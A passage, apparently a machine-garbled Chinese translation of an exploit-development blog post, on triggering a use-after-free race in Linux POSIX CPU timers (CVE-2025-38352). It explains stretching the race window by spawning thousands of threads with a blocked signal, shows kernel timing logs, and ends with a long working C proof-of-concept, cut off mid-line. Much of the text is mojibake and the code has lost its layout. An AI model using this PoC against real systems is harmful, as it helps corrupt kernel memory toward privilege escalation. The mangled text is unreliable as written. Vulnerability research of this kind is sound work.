thread æ¶ˆè€—è¶³å¤Ÿå¤šçš„ CPU time æ¥è§¦å‘Â handle_posix_cpu_timers()  
ã€‚  
  
è¿è¡Œè¯¥ PoC åçš„Â dmesg  
æ—¥å¿—å¦‚ä¸‹ (ä¸åŒ…å«é‚£äº›ä¼šè¿›ä¸€æ­¥å»¶é•¿ç«äº‰çª—å£çš„é¢å¤–æ”¹åŠ¨):  
```
~ $ /poc[ Â Â 10.543155] handle_posix_cpu_timers: delta_ns=3140~ $ /poc[ Â Â 10.964147] handle_posix_cpu_timers: delta_ns=4990~ $ /poc[ Â Â 11.404146] handle_posix_cpu_timers: delta_ns=6000
```  
  
å¹³å‡æ¥çœ‹ï¼Œéå†Â firing  
list ä¸­çš„ 19 ä¸ª timers å¤§çº¦ä¼šèŠ±Â 4000-7000  
nsã€‚  
  
æ ¹æ®æˆ‘çš„æµ‹è¯•ï¼Œè¿™ä»ç„¶ä¸è¶³ä»¥è§¦å‘æ¼æ´ï¼š  
1. åœ¨å›æ”¶ zombieÂ REAPEE  
thread ä¹‹åï¼Œä¾ç„¶å¾ˆéš¾è®©Â timer_delete()  
ç²¾å‡†å‘½ä¸­è¿™ä¸ªçª—å£ã€‚  
  
1. å³ä½¿æˆ‘ä»¬â€œèµ¢äº†â€ç«äº‰ï¼Œä¹Ÿå‡ ä¹æ²¡æœ‰æ—¶é—´è®© RCU free å‘ç”Ÿã€‚  
  
æ‰€ä»¥æˆ‘ä»¬å¿…é¡»æƒ³åŠæ³•æŠŠç«äº‰çª—å£å»¶é•¿å¾—æ›´å¤šâ€¦â€¦çº³ç§’çº§ä¸å¤Ÿï¼Œæˆ‘ä»¬éœ€è¦æ¯«ç§’çº§ï¼  
## å»¶é•¿ç«äº‰çª—å£ (Part 2)  
  
ä»å®è§‚ä¸Šçœ‹ï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸¤ä¸ªæ€è·¯å¯ä»¥å»¶é•¿ç«äº‰çª—å£ï¼š  
1. éå† list æ—¶ï¼Œä¼šå°è¯•è·å–Â timer->it_lock  
ï¼Œç¨åè¿˜ä¼šè·å–Â task->sighand->siglock  
ã€‚å¦‚æœèƒ½åœ¨åˆé€‚æ—¶æœºè®©å¦ä¸€é¢— CPU é•¿æ—¶é—´æŒæœ‰è¿™äº›é”ï¼Œå°±èƒ½å»¶é•¿ç«äº‰çª—å£ã€‚  
  
1. è§¦å‘ timers æ¶‰åŠå‘é€ signalsã€é‡æ–° arm timers ä»¥åŠä¸€å †å…¶å®ƒé€»è¾‘ã€‚ä¹Ÿè®¸å¯ä»¥ç ”ç©¶è¿™æ¡é“¾è·¯ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åŠæ³•æŠŠç«äº‰çª—å£æ‹‰é•¿ï¼Ÿ  
  
### é€‰é¡¹ 1ï¼šé”å†²çª (Lock Collisions)  
  
æˆ‘å®¡è®¡äº†æ‰€æœ‰ä¼šè·å–Â timer->it_lock  
ä¸Â task->sighand->lock  
çš„ä»£ç è·¯å¾„ï¼Œè¯•å›¾æ‰¾å‡ºæ˜¯å¦å­˜åœ¨â€œèƒ½é•¿æ—¶é—´æŒé”â€çš„é€‰é¡¹ã€‚ä½†è¿™ä¸ªæ€è·¯æœ‰å‡ ä¸ªé—®é¢˜ã€‚  
  
ç¬¬ä¸€ä¸ªé—®é¢˜ä¸ç«äº‰çª—å£å¤ªçŸ­æœ‰å…³ï¼šä¸ä»…è¦åœ¨çª—å£å†…æŠ¢åˆ°å…¶ä¸­ä»»æ„ä¸€ä¸ªé”ï¼Œè¿˜å¿…é¡»åœ¨Â firing  
list å³å°†ä¸ºç‰¹å®š timer/task è·å–è¯¥é”çš„é‚£ä¸ªç¬é—´æŠ¢åˆ°ã€‚è¿™åœ¨Â 4000-7000  
ns çš„çª—å£é‡Œå‡ ä¹ä¸å¯èƒ½åšåˆ°ã€‚  
  
ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼šæˆ‘æ‰¾ä¸åˆ°ä»»ä½•èƒ½ä»¥â€œå¤§ / å¯æ§æ—¶é•¿â€æŒæœ‰è¿™äº›é”çš„ä»£ç è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œè™½ç„¶Â timer_gettime()  
ä¼šè°ƒç”¨Â copy_to_user()  
ï¼Œä½†å®ƒåœ¨è¿™ä¹‹å‰å°±é‡Šæ”¾äº†Â timer->it_lock  
ã€‚æ€»ä½“æ¥è¯´ï¼Œæ‰€æœ‰è·¯å¾„éƒ½æ˜¯å¿«é€ŸåŠ é”ã€å¿«é€Ÿé‡Šæ”¾ã€‚  
  
ä¸è¿‡ï¼Œæˆ‘ä¹‹å‰ä» Jann Horn çš„ä¸€ç¯‡åšå®¢é‡Œå­¦åˆ°äº†ä¸€ç‚¹ï¼špreemptible kernels (ä¾‹å¦‚ Android kernel) ç†è®ºä¸Šå¯ä»¥åœ¨ä»»æ„ç‚¹ preempt ä»£ç ï¼Œé™¤éä»£ç è¿è¡Œåœ¨ç¦ç”¨ preemption çš„ä¸Šä¸‹æ–‡ä¸­ã€‚  
  
çŸ¥é“è¿™ä¸€ç‚¹ä¹‹åï¼Œæˆ‘æƒ³ï¼šèƒ½ä¸èƒ½è®©å¦ä¸€é¢— CPU ä¸Šçš„æŸä¸ª task æŠ¢åˆ°Â timer->it_lock  
/Â task->sighand->lock  
ï¼Œç„¶åè®©å®ƒè¢« preemptï¼Œä»è€ŒæŠŠé”â€œå¡ä½â€æ›´ä¹…ï¼Ÿ  
  
é—æ†¾çš„æ˜¯ä¸è¡Œã€‚è¿™ä¸¤ä¸ªé”éƒ½æ˜¯é€šè¿‡Â spin_lock()  
/spin_lock_irq()  
/spin_lock_irqsave()  
è·å–çš„ï¼Œåœ¨æŒé”æœŸé—´ä¼šç¦ç”¨ preemptionã€‚  
  
**å› æ­¤ï¼Œé”å†²çªè¿™æ¡è·¯å¯ä»¥å½»åº•æ’é™¤ã€‚**  
### é€‰é¡¹ 2ï¼šè®© Timers çš„è§¦å‘è¿‡ç¨‹æ›´â€œé•¿â€  
  
æˆ‘èŠ±äº†ä¸å°‘æ—¶é—´å®¡è®¡Â cpu_timer_fire()  
ï¼Œçœ‹çœ‹ timer çš„è§¦å‘é€»è¾‘æ˜¯æ€ä¹ˆå®ç°çš„ã€‚æˆ‘ä¸»è¦åœ¨æ‰¾ï¼šæœ‰æ²¡æœ‰æŸäº› loopsï¼Œå¯ä»¥è®©æˆ‘ä» userland å¯¹è¿­ä»£æ¬¡æ•°æ–½åŠ æ§åˆ¶ã€‚  
  
å…¶ä¸­Â complete_signal()  
å¼•èµ·äº†æˆ‘çš„æ³¨æ„ã€‚å®ƒå¯ä»¥é€šè¿‡ä¸‹é¢çš„è°ƒç”¨æ ˆåˆ°è¾¾ï¼š  
```
handle_posix_cpu_timers()-> cpu_timer_fire()-> posix_timer_queue_signal()-> send_sigqueue()-> complete_signal()
```  
  
åœ¨Â complete_signal()  
ä¸­ï¼Œæˆ‘æ³¨æ„åˆ°æœ‰ä¸¤ä¸ª while loop (ä»£ç å¦‚ä¸‹ï¼Œå·²ç®€åŒ–):  
```
staticvoidcomplete_signal(intÂ sig,Â structÂ task_struct *p,Â enumÂ pid_type type){// [ ... ]// Faith: If a PID is specified to deliver the signal to, and that thread / process// Â  Â  Â  Â is accepting this signal, use itifÂ (wants_signal(sig, p))Â  t = p;// Faith: Else if that PID does accept this signal, and there are no other threads,// Â  Â  Â  Â just return early.elseifÂ ((type == PIDTYPE_PID) ||Â thread_group_empty(p))return;elseÂ {// Faith: iterate over every thread until we find one that is accepting this// Â  Â  Â  Â signalÂ  t =Â signal->curr_target;whileÂ (!wants_signal(sig, t)) {Â  Â t =Â next_thread(t);ifÂ (t ==Â signal->curr_target)// Faith: no thread found accepting this signal, just returnreturn;Â  }signal->curr_target = t;Â }// Faith: If a fatal signal is detected (and some other conditions)ifÂ (sig_fatal(p, sig) &&Â  Â  Â (signal->core_state || !(signal->flags & SIGNAL_GROUP_EXIT)) &&Â  Â  Â !sigismember(&t->real_blocked, sig) &&Â  Â  Â (sig == SIGKILL || !p->ptrace)) {// [ ... ]// Faith: The code here iterates over every thread in this thread// Â  Â  Â  Â group and delivers a `SIGKILL` to it to kill it.Â }// [ ... ]}
```  
  
åœ¨ä¸Šé¢çš„ä»£ç é‡Œï¼Œæœ‰ä¸¤ä¸ªå¾ªç¯ï¼š  
1. å¦‚æœæˆ‘ä»¬è®© timer å‘é€ signal æ—¶ä¸æŒ‡å®š TIDï¼Œå°±ä¼šè¿›å…¥ç¬¬ä¸€ä¸ªÂ while  
loopã€‚å®ƒä¼šéå† thread group é‡Œçš„æ¯ä¸ª threadï¼Œå¯»æ‰¾ä¸€ä¸ªæ²¡æœ‰æŠŠè¯¥ signal block æ‰çš„ thread (signals å¯ä»¥é€šè¿‡Â sigprocmask()  
æ¥ block)ã€‚  
  
1. ç¬¬äºŒä¸ªå¾ªç¯è¢«æˆ‘æ³¨é‡Šæ‰äº†ï¼Œä½†å®ƒåªä¼šåœ¨â€œè¦æŠ•é€’çš„ signal è¢«è®¤ä¸ºæ˜¯ fatalâ€ (å†åŠ ä¸Šä¸€äº›å…¶å®ƒæ¡ä»¶) æ—¶è¿›å…¥ã€‚å®ƒä¼šæ€æ‰è¯¥ thread group ä¸­çš„æ¯ä¸ª threadã€‚  
  
æˆ‘è®¤ä¸ºç¬¬äºŒä¸ªå¾ªç¯åœ¨å®è·µä¸­åŸºæœ¬ä¸å¯ç”¨ï¼Œå› ä¸ºå®ƒä¼šæ€æ‰æ•´ä¸ª thread groupã€‚ä¸è¿‡æˆ‘ä¹Ÿä¸æƒ³æŠŠè¯è¯´æ­» ğŸ˜… ä¹Ÿè®¸å­˜åœ¨ä¸€ç§åœºæ™¯ï¼šå¤šä¸ªè¿›ç¨‹èƒ½è¢«åŒæ­¥åˆ°åœ¨åŒä¸€ä¸ª CPU ä¸Šè§¦å‘å®ƒä»¬çš„ timersã€‚åœ¨è¿™ç§åœºæ™¯é‡Œï¼Œå…¶å®ƒâ€œæ— å…³â€è¿›ç¨‹å³ä¾¿è¢«æ€ä¹Ÿä¸ä¼šå½±å“ä¸» exploit è¿›ç¨‹ï¼Œä»è€Œè®©ç¬¬äºŒä¸ªå¾ªç¯å˜å¾—å¯èƒ½å¯ç”¨ã€‚**ä½†æˆ‘æ²¡æœ‰æµ‹è¯•æˆ–éªŒè¯è¿‡è¿™ä¸€ç‚¹ã€‚**  
  
åœ¨æˆ‘çš„ PoC ä¸­ï¼Œæˆ‘åªåˆ©ç”¨äº†ç¬¬ä¸€ä¸ªÂ while  
loop æ¥å»¶é•¿ç«äº‰çª—å£ã€‚ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹çœ‹å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹ã€‚  
## ç¬¬äºŒä¸ªæ”¹è¿›ï¼šåˆ·çº¿ç¨‹ (Spamming Threads)  
  
ä»ä¸Šé¢å¯¹Â complete_signal()  
çš„åˆ†æå¯çŸ¥ï¼šå®ƒä¼šéå†å½“å‰è¿›ç¨‹ä¸­çš„æ¯ä¸€ä¸ª threadï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªâ€œæ„¿æ„æ¥æ”¶â€è¯¥ signal çš„ threadã€‚  
  
é‚£ä¹ˆÂ wants_signal()  
æ˜¯æ€ä¹ˆå®ç°çš„ï¼Ÿ(ä»£ç å¦‚ä¸‹ï¼Œå·²ç®€åŒ–)  
```
staticinlineboolwants_signal(intÂ sig,Â structÂ task_struct *p){ifÂ (sigismember(&p->blocked, sig))returnfalse;// [ ... ]}
```  
  
wants_signal()  
é‡Œå…¶å®è¿˜æœ‰ä¸€äº›å…¶å®ƒæ¡ä»¶ï¼Œä½†å®ƒé¦–å…ˆæ£€æŸ¥çš„æ˜¯ï¼šè¯¥ thread æ˜¯å¦ block äº† timer è¯•å›¾å‘é€çš„ signalã€‚  
  
->blocked  
å­—æ®µä¿å­˜äº†ä¸€å¼  bitmapï¼Œç”¨äºè¡¨ç¤ºå“ªäº› signals è¢« blockã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡Â sigprocmask()  
+Â SIG_BLOCK  
å¾€é‡Œé¢æ·»åŠ  signals (ä»£ç å¦‚ä¸‹ï¼Œå·²ç®€åŒ–):  
```
intsigprocmask(intÂ how,Â sigset_tÂ *set,Â sigset_tÂ *oldset){// [ ... ]switchÂ (how) {caseÂ SIG_BLOCK:sigorsets(&newset, &tsk->blocked, set);break;// [ ... ]Â }__set_current_blocked(&newset);return0;}
```  
  
å› æ­¤ï¼Œç»“åˆä»¥ä¸Šä¿¡æ¯ï¼Œæˆ‘ä»¬å°±èƒ½å¼ºè¿« kernel åœ¨æ¯ä¸€ä¸ªâ€œstallâ€timer ä¸ŠæŠŠè¿™æ®µ while loop è·‘å¾ˆå¤šæ¬¡ã€‚å”¯ä¸€çš„é™åˆ¶ï¼Œæ˜¯æˆ‘ä»¬èƒ½åˆ›å»ºå¤šå°‘ threadsã€‚  
  
å®ç°æ­¥éª¤å¦‚ä¸‹ï¼š  
1. åœ¨ exploit child process åˆ›å»ºä»»ä½• threads ä¹‹å‰ï¼Œå…ˆé€šè¿‡Â sigprocmask()  
blockÂ SIGUSR1  
ã€‚  
  
1. exploit child process å°±æ˜¯åŒ…å«Â REAPEE  
thread çš„é‚£ä¸ªè¿›ç¨‹ã€‚  
  
1. åˆ›å»ºÂ REAPEE  
threadã€‚åœ¨åˆ›å»º timers æ—¶ï¼Œç¡®ä¿ timer çš„Â sigevent.sigev_notify  
è®¾ç½®ä¸ºÂ SIGEV_SIGNAL  
ã€‚  
  
1. è¿™æ ·ä¼šå°è¯•æŠŠ signal å‘é€ç»™å½“å‰ thread group ä¸­ä»»æ„ä¸€ä¸ªä¼šæ¥æ”¶è¯¥ signal çš„ threadã€‚  
  
1. åœ¨ exploit child process é‡Œå°½å¯èƒ½å¤šåœ°åˆ›å»º threads (æˆ‘ç”¨çš„æ˜¯Â NUM_SLEEP_THREADS=10000  
)ã€‚  
  
1. è¿™äº› threads (ä»¥åŠä¸Šé¢çš„Â REAPEE  
thread) ä¼šç»§æ‰¿ exploit child process çš„Â SIGUSR1  
blocked çŠ¶æ€ã€‚  
  
1. æŒ‰ç…§åŸæµç¨‹ç»§ç»­è§¦å‘æ¼æ´å³å¯ã€‚  
  
å½“ timers è§¦å‘åï¼Œhandle_posix_cpu_timers()  
å†…éƒ¨éå†Â firing  
list æ—¶ï¼Œä¼šä¸ºæ¯ä¸ª timer è°ƒç”¨ä¸€æ¬¡Â complete_signal()  
ï¼›è€Œæ¯ä¸ª timer éƒ½ä¼šåœ¨Â complete_signal()  
çš„Â while  
loop é‡Œè¿­ä»£Â NUM_SLEEP_THREADS=10000  
æ¬¡æ‰è¿”å›ã€‚  
  
æˆ‘å·²ç»åœ¨ åŒä¸€ä¸ª profiling PoC é‡Œå®ç°äº†è¿™ä¸€ç‚¹ã€‚åŠ ä¸Šç¬¬äºŒä¸ªæ”¹è¿›åï¼Œè¿è¡Œç»“æœå¦‚ä¸‹ï¼š  
```
~ $ /poc[ Â  Â 2.386969] handle_posix_cpu_timers: delta_ns=4895749~ $ /poc[ Â  Â 3.101971] handle_posix_cpu_timers: delta_ns=3904588~ $ /poc[ Â  Â 3.679125] handle_posix_cpu_timers: delta_ns=4052398
```  
  
æå‡å·¨å¤§ï¼éå†Â firing  
list çš„è€—æ—¶ç°åœ¨å¤§çº¦åœ¨Â 4,000,000-5,000,000  
ns (4-5 ms) ä¹‹é—´ï¼è¿™ç»å¯¹è¶³å¤Ÿè®©æˆ‘ä»¬åŒæ—¶åšåˆ°ï¼š  
1. åœ¨ç«äº‰çª—å£å†…å‘½ä¸­Â timer_delete()  
ã€‚  
  
1. è®© RCU free æœ‰æ—¶é—´å®Œæˆï¼Œä»è€Œè§¦å‘ UAFã€‚  
  
è‡³æ­¤ï¼ŒPoC å°±èƒ½åœ¨ä¸éœ€è¦ä»»ä½•â€œäººä¸º kernel patchâ€çš„æƒ…å†µä¸‹è§¦å‘è¯¥ç«äº‰æ¡ä»¶ã€‚  
## å…¶å®ƒæ”¹è¿›ä¸æƒ³æ³•  
  
æˆ‘è¿˜å¯¹æœ€ç»ˆ PoC åšäº†ä¸€äº›é¢å¤–æ”¹è¿›ï¼š  
1. æˆ‘æŠŠé‡è¯•é€»è¾‘ç›´æ¥å†™è¿›äº† PoCï¼Œå› æ­¤ä½ åªéœ€è¦è¿è¡ŒÂ /poc  
ï¼Œä¸å†éœ€è¦Â while true; do /poc; done  
ã€‚  
  
1. æˆ‘åœ¨åˆ é™¤ timer ä¹‹å‰åŠ äº†ä¸€ä¸ª 1 ms sleepã€‚ç”±äºç«äº‰çª—å£è‡³å°‘ä¼šæ‰“å¼€ 3 msï¼Œè¿™ä¸ª sleep æœ‰åŠ©äºç¡®ä¿Â timer_delete()  
çœŸçš„è½åœ¨ç«äº‰çª—å£é‡Œã€‚  
  
## Part 3 çš„è®¡åˆ’ï¼Ÿ  
  
å†™è¿™ç¯‡æ–‡ç« æ—¶ï¼Œæˆ‘ç¡®å®šä¼šç»§ç»­ç ”ç©¶è¿™ä¸ªæ¼æ´çš„ exploitã€‚cross-cache åœ¨è¿™é‡Œå®Œå…¨å¯è¡Œï¼Œå…³é”®åªæ˜¯è¦åˆ¤æ–­â€œä»€ä¹ˆæ—¶å€™èµ¢äº†ç«äº‰ã€ä»€ä¹ˆæ—¶å€™è¾“äº†ç«äº‰â€ã€‚  
  
ä¸è¿‡ç°åœ¨æ˜¯èŠ‚å‡æ—¥ï¼Œè·ç¦»æˆ‘çœŸæ­£æŠŠå®ƒæ”¶å°¾å¯èƒ½è¿˜è¦ä¸€æ®µæ—¶é—´ã€‚ä½†è¯·æ”¾å¿ƒï¼šè¿™ä¸ªæ¼æ´éå¸¸é€‚åˆç”¨æ¥ç»ƒæ‰‹å¹¶æå‡ exploit development æŠ€èƒ½ï¼Œæ‰€ä»¥æˆ‘å¯¹æŠŠå®ƒåšå®Œè¿™ä»¶äº‹å¾ˆæœ‰ä¿¡å¿ƒï¼ğŸ˜„  
## ç»“è¯­  
  
ä¸€å¦‚æ—¢å¾€ï¼Œå¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜ï¼Œæ¬¢è¿éšæ—¶æé—®ï¼  
## æœ€ç»ˆ PoC  
  
æœ€ç»ˆ PoCã€kernel profiler patch (ä»¥åŠæˆ‘ç”¨æ¥æµ‹è¯•ç«äº‰çª—å£é•¿åº¦çš„ profiling PoC) éƒ½åœ¨æˆ‘çš„ Github repo é‡Œï¼š  
  
https://github.com/farazsth98/poc-CVE-2025-38352  
  
æˆ‘ä¹Ÿä¼šæŠŠ demo å’Œ PoC æ”¾åœ¨ä¸‹æ–¹ã€‚æœ¬æ–‡åˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼  
  
![demo](https://mmbiz.qpic.cn/mmbiz_gif/hoiaQy7WhTCPaZqqxK9GYFKIeFLPqibZSkr8gKS93s2sicudUkQicx2dmGUUp5l7n5wbkLHV2KU6sJNhLhH966mLUA/640?wx_fmt=gif&from=appmsg "")  
  
demo  
```
#define_GNU_SOURCE#include<time.h>#include<signal.h>#include<stdio.h>#include<unistd.h>#include<pthread.h>#include<sys/ptrace.h>#include<sys/wait.h>#include<sys/types.h>#include<stdlib.h>#include<err.h>#include<sys/prctl.h>#include<sched.h>#include<linux/membarrier.h>#include<sys/syscall.h>#defineSYSCHK(x) ({ Â  Â  Â  Â  Â  Â \typeof(x) __res = (x); Â  Â  Â \ifÂ (__res == (typeof(x))-1) \err(1,Â "SYSCHK("Â #xÂ ")"); \Â  Â  __res; Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â \})#defineNUM_SAMPLES100000#defineNUM_TIMERS18#defineONE_MS_NSÂ 1000000uLL#defineNUM_SLEEP_THREADS10000#defineNUM_SLEEP_THREADS_KASAN4500// KASAN has a smaller thread limit#defineSYSCALL_LOOP_TIMES_MAX150voidpin_on_cpu(intÂ i) {cpu_set_tÂ mask;CPU_ZERO(&mask);CPU_SET(i, &mask);sched_setaffinity(0,Â sizeof(mask), &mask);}voidwait_for_rcu() {syscall(__NR_membarrier, MEMBARRIER_CMD_GLOBAL,Â 0);}staticinlinelonglongts_to_ns(conststructtimespecÂ *ts) {returnÂ (longlong)ts->tv_sec *Â 1000000000LLÂ + (longlong)ts->tv_nsec;}staticlongintÂ clock_gettime_avg =Â 0;staticlongintÂ getpid_avg =Â 0;// Can overflow if `NUM_SAMPLES` is too high, but with simple syscalls,// this works just finelongintgetpid_cpu_usage() {structtimespecÂ *ts =Â malloc(NUM_SAMPLES *Â sizeof(structtimespec));// If we don't have `clock_gettime` avg CPU time usage, get it nowifÂ (clock_gettime_avg ==Â 0) {forÂ (intÂ i =Â 0; i < NUM_SAMPLES; i++) {syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);Â  Â  Â  Â  }longintÂ total_nsec =Â 0;forÂ (intÂ i =Â 0; i < NUM_SAMPLES-1; i++) {longintÂ time_taken = (longint)(ts_to_ns(&ts[i +Â 1]) -Â ts_to_ns(&ts[i]));Â  Â  Â  Â  Â  Â  total_nsec += time_taken;Â  Â  Â  Â  }Â  Â  Â  Â  clock_gettime_avg = total_nsec / (NUM_SAMPLES-1);Â  Â  }forÂ (intÂ i =Â 0; i < NUM_SAMPLES; i++) {syscall(__NR_clock_gettime, CLOCK_THREAD_CPUTIME_ID, &ts[i]);syscall(__NR_getpid);Â  Â  }longintÂ total_nsec =Â 0;forÂ (intÂ i =Â 0; i < NUM_SAMPLES-1; i++) {longintÂ time_taken = (longint)(ts_to_ns(&ts[i +Â 1]) -Â ts_to_ns(&ts[i])) - clock_gettime_avg;Â  Â  Â  Â  total_nsec += time_taken;Â  Â  }free(ts);returnÂ total_nsec / (NUM_SAMPLES-1);}/* Global variables for exploit setup START */pthread_barrier_tÂ barrier;// Timers used to stall `handle_posix_cpu_timers()` to extend the race windowtimer_tÂ stall_timers[NUM_TIMERS];timer_tÂ uaf_timer;// Thread that will trigger the timer handling, and also the thread that will// be reaped by the exploit parent processpthread_tÂ reapee_thread;intÂ e2w[2];Â // exploit process to wrapper process comm pipefdsintÂ c2p[2];Â // child to parent comm pipefdsintÂ p2c[2];Â // parent to child comm pipefdsintÂ stall_fds[2];Â // stall pipe fds for the sleep func// Amount of LESS times to loop the `getpid()` syscall to waste CPU timeintÂ syscall_loop_times =Â 20;intÂ retry_count =Â 0;/* Global variables for exploit setup END */voidreapee_func(void) {// Pin to same CPU as sleeper threadspin_on_cpu(2);structsigeventÂ sev = {0};Â  Â  sev.sigev_notifyÂ = SIGEV_SIGNAL;Â  Â  sev.sigev_signoÂ = SIGUSR1;charÂ m;prctl(PR_SET_NAME,Â "REAPEE");// Send this thread's TID to the parent processpid_tÂ tid = (pid_t)syscall(SYS_gettid);SYSCHK(write(c2p[1], &tid,Â sizeof(pid_t)));// Wait for parent to attach and continuepthread_barrier_wait(&barrier);Â // barrier 1// Create the maximum amount of timers minus oneforÂ (intÂ i =Â 0; i < NUM_TIMERS; i++) {SYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &stall_timers[i]));Â  Â  }// Create the UAF timer as the last timerSYSCHK(timer_create(CLOCK_THREAD_CPUTIME_ID, &sev, &uaf_timer));// Wait for the main thread to arm the timers. This is to make sure// this thread does not use CPU time to arm the timers.pthread_barrier_wait(&barrier);Â // barrier 2pthread_barrier_wait(&barrier);Â // barrier 3// Waste just the right amount of CPU time now without firing any of the timersforÂ (intÂ i =Â 0; i < ((ONE_MS_NS / getpid_avg) - syscall_loop_times); i++) {syscall(__NR_getpid);Â  Â  }// This `return` will trigger `do_exit()` in the kernel, which hopefully will// fire the timers after `exit_notify()` wakes up the `waitpid()` in the exploit// parent processreturn;}voidsleep_func(void) {// same CPU as REAPEE threadpin_on_cpu(2);charÂ m;prctl(PR_SET_NAME,Â "SLEEPER");// Block and sleep without using the CPUread(stall_fds[0], &m,Â 1);}intmain(intÂ argc,Â charÂ *argv[]) {// Loop for wrapper processwhileÂ (1) {// Wrapper process setupprintf("Wrapper: tryÂ %d\n", ++retry_count);SYSCHK(pipe(e2w));pid_tÂ exploit_pid =Â SYSCHK(fork());ifÂ (exploit_pid) {// wrapper process (pinning CPU here doesn't matter)charÂ m;close(e2w[1]);// Blocking read until retryintÂ read_count =Â read(e2w[0], &m,Â 1);// If read_count > 0, retryifÂ (read_count ==Â 0)Â break;// Decrease amount of loop times for next retry, but// cap it at SYSCALL_LOOP_TIMES_MAXÂ  Â  Â  Â  Â  Â  syscall_loop_times++;Â  Â  Â  Â  Â  Â  syscall_loop_times %= SYSCALL_LOOP_TIMES_MAX+1;Â  Â  Â  Â  Â  Â  syscall_loop_times = syscall_loop_times ==Â 0Â ?Â 20Â : syscall_loop_times;// Close pipes so they can be recreated againclose(e2w[0]);// Wait for exploit to exitwaitpid(exploit_pid,Â NULL, __WALL);Â  Â  Â  Â  }Â elseÂ {// exploit processcharÂ m;close(e2w[0]);// Parent and child setup// Use pipes to communicate between parent and childSYSCHK(pipe(c2p));SYSCHK(pipe(p2c));// Get the average CPU time usage of the `getpid()` syscall, so we// can use it for the trigger laterÂ  Â  Â  Â  Â  Â  getpid_avg =Â getpid_cpu_usage();pid_tÂ pid =Â SYSCHK(fork());ifÂ (pid) {// exploit parent processpin_on_cpu(1);charÂ m;close(c2p[1]);close(p2c[0]);prctl(PR_SET_NAME,Â "EXPLOIT_PARENT");// Receive child process's REAPEE thread's TIDpid_tÂ tid;SYSCHK(read(c2p[0], &tid,Â sizeof(pid_t)));// Attach to the REAPEE thread and continue itSYSCHK(ptrace(PTRACE_ATTACH, tid,Â NULL,Â NULL));SYSCHK(waitpid(tid,Â NULL, __WALL));SYSCHK(ptrace(PTRACE_CONT, tid,Â NULL,Â NULL));// Signal to child that we attached and continuedSYSCHK(write(p2c[1], &m,Â 1));// Reap the REAPEE thread now. This will block and wait until// the REAPEE thread is able to get through `exit_notify()` and// wake this parent process up.SYSCHK(waitpid(tid,Â NULL, __WALL));// At this point, if UAF timer fired at the right time, the REAPEE thread// will be reaped while it's `tsk->exit_state` is set to `EXIT_ZOMBIE`.//// Let the child process know REAPEE is reaped, so it can delete the// timer.SYSCHK(write(p2c[1], &m,Â 1));// Let the child process delete and free the timer, and// all threads before exitingSYSCHK(read(c2p[0], &m,Â 1));// Signal to wrapper process to retry and exit// TODO exploit: Figure out how to detect if we triggered UAF hereSYSCHK(write(e2w[1], &m,Â 1));// Wait for child to exit before exitingwaitpid(pid,Â NULL, __WALL);close(e2w[1]);close(c2p[0]);close(p2c[1]);exit(0);Â  Â  Â  Â  Â  Â  }Â elseÂ {// exploit child processpin_on_cpu(0);charÂ m;close(c2p[0]);close(p2c[1]);// Pipefd for sleep threads to block onSYSCHK(pipe(stall_fds));// Block SIGUSR1, blocks them in subsequent threads toosigset_tÂ mask;sigemptyset(&mask);sigaddset(&mask, SIGUSR1);sigprocmask(SIG_BLOCK, &mask,Â NULL);prctl(PR_SET_NAME,Â "EXPLOIT_CHILD");pthread_barrier_init(&barrier,Â NULL,Â 2);// Change this depending on KASAN vs no KASANintÂ num_sleep_threads = NUM_SLEEP_THREADS;pthread_tÂ sleep_threads[num_sleep_threads];SYSCHK(pthread_create(&reapee_thread,Â NULL, (void*)reapee_func,Â NULL));forÂ (intÂ i =Â 0; i < num_sleep_threads; i++) {intÂ ret =Â pthread_create(&sleep_threads[i],Â NULL, (void*)sleep_func,Â NULL);ifÂ (ret !=Â 0) {// If this condition is reached, change `num_sleep_threads` aboveprintf("Failed on threadÂ %d\n", i+1);Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  num_sleep_threads = i;break;Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  }Â  Â  Â  Â  Â  Â  Â  Â  }// Wait for all threads to create and go to sleepusleep(10Â *Â 1000);// Parent process writes to us when attached and continued, use// a barrier to continue the REAPEE thread nowSYSCHK(read(p2c[0], &m,Â 1));pthread_barrier_wait(&barrier);Â // barrier 1// Wait for timers to be created by REAPEE threadpthread_barrier_wait(&barrier);Â // barrier 2// Arm the timers now, ensuring the first 18 are before the// UAF timerstructÂ itimerspec ts = {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .it_intervalÂ = {0,Â 0},Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .it_valueÂ = {Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .tv_secÂ =Â 0,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  .tv_nsecÂ = ONE_MS_NS -Â 1,Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  },Â  Â  Â  Â  Â  Â  Â  Â  };forÂ (intÂ i =Â 0; i < NUM_TIMERS; i++) {timer_settime(stall_timers[i],Â 0, &ts,Â NULL);Â  Â  Â  Â  Â  Â  Â  Â  }// Arm UAF timer as the latest oneÂ  Â  Â  Â  Â  Â  Â  Â  ts.it_value.tv_nsecÂ = ONE_MS_NS;timer_settime(uaf_timer,Â 0, &ts,Â NULL);// Timers are armed, let REAPEE thread continuepthread_barrier_wait(&barrier);Â // barrier 3// Parent process writes to us when waitpid() returns successfully.//// At this point, if we won the race, `handle_posix_cpu_timers()` will be in// the race window, and `timer_delete()` should see a NULL `sighand`, which// will cause it to just free the timer unconditionally.SYSCHK(read(p2c[0], &m,Â 1));// The race window is open for at least 3ms generally, so we can sleep// 1ms to increase our chances to hit it with our free here.//// Might need to modify this for different systems, because it depends on// how much time the race window is open for. KASAN will also not allow// as many sleeper threads, so this will need to be lowered a bit if it's// enabled.usleep(1Â *Â 